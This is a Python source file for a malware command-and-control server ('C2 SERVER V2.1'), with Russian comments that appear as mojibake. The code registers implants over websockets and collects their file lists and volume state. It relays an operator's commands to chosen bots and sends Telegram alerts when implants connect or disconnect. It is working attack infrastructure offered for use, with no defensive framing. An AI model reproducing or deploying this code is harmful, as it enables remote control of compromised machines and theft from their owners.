#
# --- –§–∞–π–ª: c2_server.py (–í–µ—Ä—Å–∏—è 2.1 - –ü—É–ª–µ–Ω–µ–ø—Ä–æ–±–∏–≤–∞–µ–º—ã–π) ---
#
import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
import settings

def send_telegram_message(message):
  """–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ."""
  def send():
    try:
      url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
      urllib.request.urlopen(url, timeout=10)
    except Exception as e:
      print(f"[!] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
  threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
  global OPERATOR, IMPLANTS
  ws = web.WebSocketResponse(); await ws.prepare(request)
  client_type, client_id = None, None
  try:
    # –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –ø–µ—Ä–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ. –ï—Å–ª–∏ –∫–ª–∏–µ–Ω—Ç –æ—Ç–≤–∞–ª–∏—Ç—Å—è —Ç—É—Ç - —ç—Ç–æ –Ω–µ —Å—Ç—Ä–∞—à–Ω–æ.
    initial_msg_raw = await ws.receive(timeout=15.0)
    if initial_msg_raw.type != web.WSMsgType.TEXT:
      await ws.close()
      return ws

    initial_msg = json.loads(initial_msg_raw.data)
    client_type = initial_msg.get('type')

    if client_type == 'operator':
      OPERATOR = ws
      print("[+] –û–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è.")
      await broadcast_bot_list()
    elif client_type == 'implant':
      client_id = initial_msg.get('id')
      IMPLANTS[client_id] = {
        "ws": ws,
        "files": initial_msg.get('files', {}),
        "volume_state": initial_msg.get('volume_state', {})
      }
      print(f"[+] –ù–æ–≤—ã–π –∏–º–ø–ª–∞–Ω—Ç –æ–Ω–ª–∞–π–Ω: {client_id}")
      send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {client_id}")
      await broadcast_bot_list()
    else:
      await ws.close()
      return ws

    async for msg in ws:
      if msg.type == web.WSMsgType.TEXT:
        if msg.data == 'ping': 
          await ws.send_str('pong')
          continue

        # <<< –ì–õ–ê–í–ù–´–ô –§–ò–ö–°: –ö–ï–í–õ–ê–†–û–í–ê–Ø –ü–õ–ê–°–¢–ò–ù–ê >>>
        # –ü—Ä–µ–∂–¥–µ —á–µ–º –¥–æ–≤–µ—Ä—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—é, –ø—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –º—É—Å–æ—Ä –ª–∏ —ç—Ç–æ.
        try:
          data = json.loads(msg.data)
        except json.JSONDecodeError:
          print(f"[!] –ü–æ–ª—É—á–µ–Ω –º—É—Å–æ—Ä –æ—Ç {client_id or '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ'}, –∏–≥–Ω–æ—Ä–∏—Ä—É—é.")
          continue # –ü—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —Å–æ–æ–±—â–µ–Ω–∏—é

        if client_type == 'operator':
          target_id = data.get('target_id')
          command_type = data.get('type')

          # –ú–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü–∏—è –∫–æ–º–∞–Ω–¥ –æ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞
          if command_type == 'command' and target_id in IMPLANTS:
            await IMPLANTS[target_id]["ws"].send_json(data['payload'])
          elif command_type == 'get_details' and target_id in IMPLANTS:
            details = {
              "files": IMPLANTS[target_id].get("files"),
              "volume_state": IMPLANTS[target_id].get("volume_state")
            }
            await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
          elif command_type == 'get_volume_state' and target_id in IMPLANTS:
             await IMPLANTS[target_id]["ws"].send_json(data['payload'])

        elif client_type == 'implant':
          # –ú–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –∏–º–ø–ª–∞–Ω—Ç–∞
          msg_from_implant_type = data.get('type')
          if msg_from_implant_type == 'file_list_update':
            if client_id in IMPLANTS:
              IMPLANTS[client_id]["files"] = data.get('data', {})
          elif msg_from_implant_type == 'volume_update':
             if client_id in IMPLANTS:
              IMPLANTS[client_id]["volume_state"] = data.get('data', {})

          # –í –ª—é–±–æ–º —Å–ª—É—á–∞–µ –ø–µ—Ä–µ—Å—ã–ª–∞–µ–º –≤—Å—ë –æ–ø–µ—Ä–∞—Ç–æ—Ä—É
          if OPERATOR:
            data['bot_id'] = client_id
            await OPERATOR.send_json(data)

  except asyncio.TimeoutError:
    print("[!] –¢–∞–π–º–∞—É—Ç –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.")
  except Exception as e:
    print(f"[!] –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –≤ websocket_handler: {e}")
  finally:
    if client_type == 'implant' and client_id in IMPLANTS:
      del IMPLANTS[client_id]
      print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: {client_id}")
      send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {client_id}")
      await broadcast_bot_list()
    elif client_type == 'operator':
      OPERATOR = None
      print("[-] –û–ø–µ—Ä–∞—Ç–æ—Ä –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
  return ws

async def broadcast_bot_list():
  if OPERATOR and not OPERATOR.closed:
    try:
      bot_ids = list(IMPLANTS.keys())
      await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
    except ConnectionResetError:
      print("[!] –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–ø–∏—Å–æ–∫ –æ—Ç–∫–ª—é—á–µ–Ω–Ω–æ–º—É –æ–ø–µ—Ä–∞—Ç–æ—Ä—É.")

async def http_handler(request):
  return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
  app = web.Application()
  app.router.add_get('/', http_handler)
  app.router.add_get('/ws', websocket_handler)
  runner = web.AppRunner(app)
  await runner.setup()
  site = web.TCPSite(runner, '0.0.0.0', 10000)
  await site.start()
  print("====== C2 SERVER (V2.1) ONLINE ======")
  send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä '–ö—Ä–µ–ø–æ—Å—Ç—å' V2.1 –∑–∞–ø—É—â–µ–Ω.")
  await asyncio.Event().wait()

if __name__ == "__main__":
  try:
    asyncio.run(main())
  except KeyboardInterrupt:
    print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤—Ä—É—á–Ω—É—é.")
  finally:
    send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä '–ö—Ä–µ–ø–æ—Å—Ç—å' V2.1 –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
